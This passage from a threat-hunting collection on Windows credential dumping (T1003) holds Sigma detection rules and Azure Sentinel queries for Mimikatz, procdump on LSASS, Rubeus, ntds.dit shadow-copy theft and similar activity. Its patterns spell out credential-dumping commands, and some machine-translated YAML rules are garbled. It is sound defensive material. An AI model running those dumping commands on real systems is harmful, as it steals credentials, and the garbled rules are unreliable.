 {'data_source': {'description': 'Detects process access to LSASS which is '
                                 'typical for Mimikatz (0x1000 PROCESS_QUERY_ '
                                 'LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ '
                                 'INFORMATION "only old versions", 0x0010 '
                                 'PROCESS_VM_READ)',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 10,
                                              'GrantedAccess': ['0x1410',
                                                                '0x1010'],
                                              'TargetImage': 'C:\\windows\\system32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': '0d894093-71bc-43c3-8c4d-ecfc28dcf5d9',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow',
                                 'https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html'],
                  'status': 'experimental',
                  'tags': ['attack.t1003',
                           'attack.s0002',
                           'attack.credential_access',
                           'car.2019-04-004'],
                  'title': 'Mimikatz Detection LSASS Access'}},
 {'data_source': {'description': 'Detects certain DLL loads when Mimikatz gets '
                                 'executed',
                  'detection': {'condition': 'selector | near dllload1 and '
                                             'dllload2 and not exclusion',
                                'dllload1': {'ImageLoaded': '*\\vaultcli.dll'},
                                'dllload2': {'ImageLoaded': '*\\wlanapi.dll'},
                                'exclusion': {'ImageLoaded': ['ntdsapi.dll',
                                                              'netapi32.dll',
                                                              'imm32.dll',
                                                              'samlib.dll',
                                                              'combase.dll',
                                                              'srvcli.dll',
                                                              'shcore.dll',
                                                              'ntasn1.dll',
                                                              'cryptdll.dll',
                                                              'logoncli.dll']},
                                'selector': {'EventID': 7,
                                             'Image': 'C:\\Windows\\System32\\rundll32.exe'},
                                'timeframe': '30s'},
                  'falsepositives': ['unknown'],
                  'id': 'c0478ead-5336-46c2-bd5e-b4c84bc3a36e',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/'],
                  'status': 'experimental',
                  'tags': ['attack.s0002',
                           'attack.t1003',
                           'attack.lateral_movement',
                           'attack.credential_access',
                           'car.2019-04-004'],
                  'title': 'Mimikatz In-Memory'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects password dumper activity by '
                                 'monitoring remote thread creation EventID 8 '
                                 'in combination with the lsass.exe process as '
                                 'TargetImage. The process in field Process is '
                                 'the malicious program. A single execution '
                                 'can lead to hundreds of events.',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 8,
                                              'StartModule': None,
                                              'TargetImage': 'C:\\Windows\\System32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'f239b326-2f41-4d6b-9dfa-c846a60ef505',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm'],
                  'status': 'stable',
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Password Dumper Remote Thread in LSASS'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/02/10',
                  'description': 'Detects a dump file written by QuarksPwDump '
                                 'password dumper',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 11,
                                              'TargetFilename': '*\\AppData\\Local\\Temp\\SAM-*.dmp*'}},
                  'falsepositives': ['Unknown'],
                  'id': '847def9e-924d-4e90-b7c4-5f581395a2b4',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'QuarksPwDump Dump File'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/26',
                  'description': 'Detects Access to LSASS Process',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 1121,
                                              'Path': '*\\lsass.exe'}},
                  'falsepositives': ['Google Chrome GoogleUpdate.exe',
                                     'Some Taskmgr.exe related activity'],
                  'id': 'a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98',
                  'level': 'high',
                  'logsource': {'definition': 'Requirements:Enabled Block '
                                              'credential stealing from the '
                                              'Windows local security '
                                              'authority subsystem (lsass.exe) '
                                              'from Attack Surface Reduction '
                                              '(GUID: '
                                              '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)',
                                'product': 'windows_defender'},
                  'references': ['https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'LSASS Access Detected via Attack Surface '
                           'Reduction'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/01/10',
                  'description': 'This method detects mimikatz keywords in '
                                 'different Eventlogs (some of them only '
                                 'appear in older Mimikatz version that are '
                                 'however still used by different threat '
                                 'groups)',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['* mimikatz *',
                                                         '* mimilib *',
                                                         '* <3 eo.oe *',
                                                         '* eo.oe.kiwi *',
                                                         '* privilege::debug *',
                                                         '* '
                                                         'sekurlsa::logonpasswords '
                                                         '*',
                                                         '* lsadump::sam *',
                                                         '* mimidrv.sys *',
                                                         '* p::d *',
                                                         '* s::l *']}},
                  'falsepositives': ['Naughty administrators',
                                     'Penetration test'],
                  'id': '06d71506-7beb-4f22-8888-e2e5e2ca7fd8',
                  'level': 'critical',
                  'logsource': {'product': 'windows'},
                  'modified': '2019/10/11',
                  'tags': ['attack.s0002',
                           'attack.t1003',
                           'attack.lateral_movement',
                           'attack.credential_access',
                           'car.2013-07-001',
                           'car.2019-04-004'],
                  'title': 'Mimikatz Use'}},
 {'data_source': {'author': 'jmallette',
                  'description': 'Detects usage of cmdkey to look for cached '
                                 'credentials',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '* /list *',
                                              'Image': '*\\cmdkey.exe'}},
                  'falsepositives': ['Legitimate administrative tasks.'],
                  'fields': ['CommandLine', 'ParentCommandLine', 'User'],
                  'id': '07f8bdc2-c9b3-472a-9817-5a670b872f53',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation',
                                 'https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Cmdkey Cached Credentials Recon'}},
 {'data_source': {'author': 'Benjamin Delpy, Florian Roth',
                  'date': '2018/06/03',
                  'description': 'Detects Mimikatz DC sync security events',
                  'detection': {'condition': 'selection and not filter1 and '
                                             'not filter2',
                                'filter1': {'SubjectDomainName': 'Window '
                                                                 'Manager'},
                                'filter2': {'SubjectUserName': ['NT AUTHORITY*',
                                                                '*$']},
                                'selection': {'EventID': 4662,
                                              'Properties': ['*Replicating '
                                                             'Directory '
                                                             'Changes All*',
                                                             '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*']}},
                  'falsepositives': ['Valid DC Sync that is not covered by the '
                                     'filters; please report'],
                  'id': '611eab06-a145-4dfa-a295-3ccc5c20f59a',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'modified': '2019/10/08',
                  'references': ['https://twitter.com/gentilkiwi/status/1003236624925413376',
                                 'https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access',
                           'attack.s0002',
                           'attack.t1003'],
                  'title': 'Mimikatz DC Sync'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/12/19',
                  'description': 'Detects command line parameters used by '
                                 'Rubeus hack tool',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* asreproast *',
                                                              '* dump '
                                                              '/service:krbtgt '
                                                              '*',
                                                              '* kerberoast *',
                                                              '* createnetonly '
                                                              '/program:*',
                                                              '* ptt /ticket:*',
                                                              '* '
                                                              '/impersonateuser:*',
                                                              '* renew '
                                                              '/ticket:*',
                                                              '* asktgt '
                                                              '/user:*',
                                                              '* harvest '
                                                              '/interval:*']}},
                  'falsepositives': ['unlikely'],
                  'id': '7ec2c172-dceb-4c10-92c9-87c1881b7e18',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/'],
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Rubeus Hack Tool'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'Detect AD credential dumping using impacket '
                                 'secretdump HKTL',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 5145,
                                              'RelativeTargetName': 'SYSTEM32\\\\*.tmp',
                                              'ShareName': '\\\\*\\ADMIN$'}},
                  'falsepositives': ['pentesting'],
                  'id': '252902e3-5830-4cf6-bf21-c22083dfd5cf',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html'],
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Possible Impacket SecretDump remote activity'}},
 {'data_source': {'action': 'global',
                  'author': 'Florian Roth',
                  'description': 'This method detects well-known keywords of '
                                 'malicious services in the Windows System '
                                 'Eventlog',
                  'detection': {'condition': '( selection1 and keywords ) or ( '
                                             'selection2 and keywords ) or '
                                             'quarkspwdump',
                                'keywords': {'Message': ['*WCE SERVICE*',
                                                         '*WCESERVICE*',
                                                         '*DumpSvc*']},
                                'quarkspwdump': {'EventID': 16,
                                                 'HiveName': '*\\AppData\\Local\\Temp\\SAM*.dmp'},
                                'selection1': {'EventID': [7045]}},
                  'falsepositives': ['Unlikely'],
                  'id': '4976aa50-8f41-45c6-8b15-ab3fc10e79ed',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'system'},
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Malicious Service Install'}},
 {'data_source': {'detection': {'selection2': {'EventID': 4697}},
                  'logsource': {'product': 'windows', 'service': 'security'}}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects wceaux.dll access while WCE '
                                 'pass-the-hash remote command execution on '
                                 'source host',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': [4656,
                                                          4658,
                                                          4660,
                                                          4663],
                                              'ObjectName': '*\\wceaux.dll'}},
                  'falsepositives': ['Penetration testing'],
                  'id': '1de68c67-af5c-4097-9c85-fe5578e09e67',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://www.jpcert.or.jp/english/pub/sr/ir_research.html',
                                 'https://jpcertcc.github.io/ToolAnalysisResultSheet'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'WCE wceaux.dll Access'}},
 {'data_source': {'author': 'Florian Roth, Tom Ueltschi',
                  'description': 'Detects NotPetya ransomware activity in '
                                 'which the extracted passwords are passed '
                                 'back to the main module via named pipe, the '
                                 'file system journal of drive C is deleted '
                                 'and windows eventlogs are cleared using '
                                 'wevtutil',
                  'detection': {'condition': '1 of them',
                                'perfc_keyword': ['*\\perfc.dat*'],
                                'pipe_com': {'CommandLine': '*\\AppData\\Local\\Temp\\\\* '
                                                            '\\\\.\\pipe\\\\*'},
                                'rundll32_dash1': {'CommandLine': '*.dat,#1',
                                                   'Image': '*\\rundll32.exe'}},
                  'falsepositives': ['Admin activity'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '79aeeb41-8156-4fac-a0cd-076495ab82a1',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://securelist.com/schroedingers-petya/78870/',
                                 'https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.credential_access',
                           'attack.defense_evasion',
                           'attack.t1085',
                           'attack.t1070',
                           'attack.t1003',
                           'car.2016-04-002'],
                  'title': 'NotPetya Ransomware Activity'}},
 {'data_source': {'author': 'Modexp (idea)',
                  'date': '2019/09/02',
                  'description': 'Detects process memory dump via comsvcs.dll '
                                 'and rundll32',
                  'detection': {'condition': '(rundll_image or rundll_ofn) and '
                                             'selection',
                                'rundll_image': {'Image': '*\\rundll32.exe'},
                                'rundll_ofn': {'OriginalFileName': 'RUNDLL32.EXE'},
                                'selection': {'CommandLine': ['*comsvcs*MiniDump*full*',
                                                              '*comsvcs*MiniDumpW*full*']}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '09e6d5c0-05b8-4ff8-9eeb-043046ec774c',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/',
                                 'https://twitter.com/SBousseaden/status/1167417096374050817'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Process dump via comsvcs DLL'}},
 {'data_source': {'description': 'Detects process handle on LSASS process with '
                                 'certain access mask and object type '
                                 'SAM_DOMAIN',
                  'detection': {'condition': 'selection',
                                'selection': {'AccessMask': '0x705',
                                              'EventID': 4656,
                                              'ObjectType': 'SAM_DOMAIN',
                                              'ProcessName': 'C:\\Windows\\System32\\lsass.exe'}},
                  'falsepositives': ['Unkown'],
                  'id': 'aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://twitter.com/jackcr/status/807385668833968128'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Password Dumper Activity on LSASS'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects execution of ntdsutil.exe, which can '
                                 'be used for various attacks against the NTDS '
                                 'database (NTDS.DIT)',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\ntdsutil*'}},
                  'falsepositives': ['NTDS maintenance'],
                  'id': '2afafd61-6aae-4df4-baed-139fa1f4c345',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Invocation of Active Directory Diagnostic Tool '
                           '(ntdsutil.exe)'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/10/30',
                  'description': 'Detects suspicious uses of the SysInternals '
                                 'Procdump utility by using a special command '
                                 'line parameter in combination with the '
                                 "lsass.exe process. This way we're also able "
                                 'to catch cases in which the attacker has '
                                 'renamed the procdump executable.',
                  'detection': {'condition': '( selection1 and selection2 ) or '
                                             'selection3',
                                'selection1': {'CommandLine': ['* -ma *']},
                                'selection2': {'CommandLine': ['* lsass*']},
                                'selection3': {'CommandLine': ['* -ma ls*']}},
                  'falsepositives': ['Unlikely, because no one should dump an '
                                     'lsass process memory',
                                     'Another tool that uses the command line '
                                     'switches of Procdump'],
                  'id': '5afee48e-67dd-4e03-a783-f74259dcf998',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/10/14',
                  'references': ['Internal Research'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.t1036',
                           'attack.credential_access',
                           'attack.t1003',
                           'car.2013-05-009'],
                  'title': 'Suspicious Use of Procdump'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious SAM dump activity as '
                                 'cause by QuarksPwDump and other password '
                                 'dumpers',
                  'detection': {'condition': 'all of them',
                                'keywords': {'Message': ['*\\AppData\\Local\\Temp\\SAM-*.dmp '
                                                         '*']},
                                'selection': {'EventID': 16}},
                  'falsepositives': ['Penetration testing'],
                  'id': '839dd1e8-eda8-4834-8145-01beeee33acd',
                  'level': 'high',
                  'logsource': {'definition': 'The source of this type of '
                                              'event is Kernel-General',
                                'product': 'windows',
                                'service': 'system'},
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'SAM Dump to AppData'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/04/09',
                  'description': 'Detects Access to Domain Group Policies '
                                 'stored in SYSVOL',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\SYSVOL\\\\*\\policies\\\\*'}},
                  'falsepositives': ['administrative activity'],
                  'id': '05f3c945-dcc8-4393-9f3d-af65077a8f86',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2018/12/11',
                  'references': ['https://adsecurity.org/?p=2288',
                                 'https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Suspicious SYSVOL Domain Group Policy Access'}},
 {'data_source': {'author': 'Florian Roth, Michael Haag',
                  'description': 'Detects suspicious commands that could be '
                                 'related to activity that uses volume shadow '
                                 'copy to steal and retrieve hashes from the '
                                 'NTDS.dit file remotely',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['vssadmin.exe '
                                                              'Delete Shadows',
                                                              'vssadmin create '
                                                              'shadow /for=C:',
                                                              'copy '
                                                              '\\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit',
                                                              'copy '
                                                              '\\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM',
                                                              'vssadmin delete '
                                                              'shadows /for=C:',
                                                              'reg SAVE '
                                                              'HKLM\\SYSTEM ',
                                                              'esentutl.exe /y '
                                                              '/vss '
                                                              '*\\ntds.dit*']}},
                  'falsepositives': ['Administrative activity'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'b932b60f-fdda-4d53-8eda-a170c1d97bbd',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/',
                                 'https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/',
                                 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/',
                                 'https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/',
                                 'https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Activity Related to NTDS.dit Domain Hash '
                           'Retrieval'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['200-500', ' 4100-4104', 'PowerShell logs']},
 {'data_source': ['Other Event IDs']},
 {'data_source': ['Memory Forensics']},
 {'data_source': ['API monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['200-500', ' 4100-4104', 'PowerShell logs']},
 {'data_source': ['Other Event IDs']},
 {'data_source': ['Memory Forensics']},
 {'data_source': ['API monitoring']}]
```

## Potential Queries

```json
[{'name': 'Credential Dumping ImageLoad',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 7and (module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\samlib.dll"or module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\WinSCard.dll"or module_loaded '
           'contains "C:\\\\Windows\\\\System32\\\\cryptdll.dll"or '
           'module_loaded contains "C:\\\\Windows\\\\System32\\\\hid.dll"or '
           'module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\vaultcli.dll")and (process_path '
           '!contains "\\\\Sysmon.exe"or process_path !contains '
           '"\\\\svchost.exe"or process_path !contains "\\\\logonui.exe")'},
 {'name': 'Credential Dumping Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_command_line contains '
           '"Invoke-Mimikatz -DumpCreds"or process_command_line contains '
           '"gsecdump -a"or process_command_line contains "wce -o"or '
           'process_command_line contains "procdump -ma lsass.exe"or '
           'process_command_line contains "ntdsutil*ac i ntds*ifm*create '
           'full")'},
 {'name': 'Credential Dumping Process Access',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 10 and target_process_path contains '
           '"C:\\\\Windows\\\\system32\\\\lsass.exe"and '
           '(process_granted_access contains "0x1010"or process_granted_access '
           'contains "0x1410"or process_granted_access contains "0x147a"or '
           'process_granted_access contains "0x143a")and process_call_trace '
           'contains "C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll"and '
           'process_call_trace contains '
           '"C:\\\\Windows\\\\system32\\\\KERNELBASE.dll"and '
           'process_call_trace contains "|UNKNOWN(*)"'},
 {'name': 'Credential Dumping Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and process_path !contains '
           '"C:\\\\WINDOWS\\\\system32\\\\lsass.exe"and (registry_key_path '
           'contains '
           '"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Authentication\\\\Credential '
           'Provider\\\\"or registry_key_path contains '
           '"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\"or '
           'registry_key_path contains '
           '"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SecurityProviders\\\\"or '
           'registry_key_path contains '
           '"\\\\Control\\\\SecurityProviders\\\\WDigest\\\\")and '
           'registry_key_path !contains '
           '"\\\\Lsa\\\\RestrictRemoteSamEventThrottlingWindow"'},
 {'name': 'Credential Dumping Registry Save',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_path contains "reg.exe"and '
           '(process_command_line contains "*save*HKLM\\\\sam*"or '
           'process_command_line contains "*save*HKLM\\\\system*")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: VSS shadow copy Ntds.dit file read local (host OS control '
           'field, is also applicable to a VSS shadow copy remote read '
           'Ntds.dit file)\n'
           'description: windows server 2008 simulation test results\n'
           'references: https://1sparrow.com/2018/02/19/ infiltration '
           'associated domain /\n'
           'tags: T1003-003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: sysmon\n'
           'detection:\n'
           '    selection1:\n'
           '        EventID: 1 # Process Creation\n'
           "        Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n"
           "        CommandLine: 'VSSADMIN.EXE'\n"
           "        CurrentDirectory: 'vssadmin create shadow / for = C:'\n"
           '    selection2:\n'
           '        EventID: 1\n'
           "        Image: 'C: \\ Windows \\ System32 \\ reg.exe'\n"
           "        CommandLine: 'reg.exe'\n"
           "        CurrentDirectory: 'reg SAVE HKLM \\ SYSTEM *'\n"
           '    selection3:\n'
           '        EventID: 1 # Process Creation\n'
           "        Image: 'C: \\ Windows \\ System32 \\ vssadmin.exe'\n"
           "        CommandLine: 'VSSADMIN.EXE'\n"
           "        CurrentDirectory: 'vssadmin delete shadows / all'\n"
           '    condition: selection1 or selection2 or selection3\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Use vssown.vbs get NTDS.dit file\n'
           'description: windows server 2016+ AD domain controller\n'
           'tags: T1003-003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: security\n'
           'detection:\n'
           '    selection:\n'
           '        EventID: 4688 # have created a new process.\n'
           '        New processname: C: \\ Windows \\ System32 \\ cscript.exe\n'
           '        Process commandline:\n'
           '           - cscript * .vbs / start # command line based '
           'detection\n'
           '           - cscript * .vbs / create c # command line based '
           'detection\n'
           '           - cscript * .vbs / delete # command line based '
           'detection\n'
           '           - cscript * .vbs / list # command line based detection\n'
           '    condition: selection\n'
           '---\n'
           'detection:\n'
           '    selection1:\n'
           '        EventID: 4904 # has been trying to register a security '
           'event source.\n'
           '        Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n'
           '        Source name: VSSAudit # Event Source\n'
           '    selection2:\n'
           '        EventID: 8222 # shadow copy has been created.\n'
           '        Process image name: C: \\ Windows \\ System32 \\ wbem \\ '
           'WmiPrvSE.exe\n'
           '        Raw volume: \\\\ \\ Volume {*} \\ # "*" represents the '
           'regular match?\n'
           '        Shadow device name: \\\\ \\ GLOBALROOT \\ Device \\ '
           'HarddiskVolumeShadowCopy * # "*" represents the regular match?\n'
           '    selection3:\n'
           '        EventID: 4905 # has been trying to unregister a security '
           'event source.\n'
           '        Processname: C: \\ Windows \\ System32 \\ VSSVC.exe\n'
           '        Source name: VSSAudit # Event Source\n'
           '    timeframe: last 10S # custom time range\n'
           '    condition: all of them\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Use ntdsutil get NTDS.dit file\n'
           'description: windows server 2008 + AD domain controller\n'
           'references: '
           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
           'tags: T1003-003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: security\n'
           'detection:\n'
           '    selection:\n'
           '        EventID: 4688 # have created a new process.\n'
           "        Newprocessname: 'C: \\ Windows \\ System32 \\ "
           "ntdsutil.exe' # new process name\n"
           '    condition: selection\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Application log file detection ntdsutil get NTDS.dit\n'
           'description: windows server 2008 + AD domain controller\n'
           'references: '
           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
           'tags: T1003-003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: application\n'
           'detection:\n'
           '    selection1:\n'
           '        EventID: 2005\n'
           "        Message: 'lsass (*) * Example shadow copy is starting. "
           'This will be a complete shadow copy. * # Represents any number '
           "'value matches\n"
           '    selection2:\n'
           '        EventID: 2001\n'
           "        Message: 'lsass (*) * Shadow copy instance freeze has "
           "begun. * # Represents any number 'value matches\n"
           '    selection3:\n'
           '        EventID: 2003\n'
           "        Message: 'lsass (*) * Shadow copy instance freeze stopped. "
           "* # Represents any number 'value matches\n"
           '    selection4:\n'
           '        EventID: 2006\n'
           "        Message: 'lsass (*) * Volume Shadow Copy instance "
           "completed successfully. * # Represents any number 'value matches\n"
           '    selection5:\n'
           '        EventID: 300\n'
           '        Message: lsass (*) The database engine is initialized '
           'recovery steps. On behalf of any value matches the number # *\n'
           '    selection6:\n'
           '        EventID: triggering a large number of events during the '
           '216 216 #\n'
           "        Message: 'lsass (*) detects that the database location "
           'changed from: "C \\ Windows \\ NTDS \\ ntds.dit" is "? \\\\ \\ '
           'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * 1 * \\ Windows '
           '\\ NTDS \\ ntds.dit". * # Represents any number \'value matches\n'
           '    selection7:\n'
           '        EventID: 302\n'
           "        Message: 'lsass (*) The database engine has successfully "
           "completed recovery steps. * # Represents any number 'value "
           'matches\n'
           'timeframe: last 10S # custom time range\n'
           '    condition: all of them\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: win-vaultcmd obtain basic information system credentials\n'
           'description: windows server 2016\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: security / Sysmon\n'
           'detection:\n'
           '    selection:\n'
           '        EventID:\n'
           '           - 4688 #windows security log, have created a new '
           'process.\n'
           '           - 1 #windows Sysmon log, create a new process\n'
           '        New processname: C: \\ Windows \\ System32 \\ VaultCmd.exe '
           '# new process name / image\n'
           '        Parent processname: C: \\ Windows \\ System32 \\ cmd.exe # '
           'creator Process Name / ParentImage\n'
           '        Process commandline:\n'
           '           - vaultcmd / list # list the vault (vault) list\n'
           '           - vaultcmd / listschema # listed vault (vault) a '
           'summary of the credentials name and GUID\n'
           '           - vaultcmd / listcreds: {*} # Chinese system, the list '
           'of all the credentials of the GUID} * {vault (Vault)\n'
           '           All credential information under the "*" # English '
           'system, called the list "*" vault (vault): vaultcmd / listcreds -\n'
           '           - vaultcmd / listproperties: {*} # Chinese system, as '
           'listed attributes GUID} * {vault (Vault), including the file '
           'location, the number of credentials included, protection method\n'
           '    condition: selection'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: plaintext to obtain the voucher --Procdump\n'
           'description: windows server 2008 simulation test results\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '    product: windows\n'
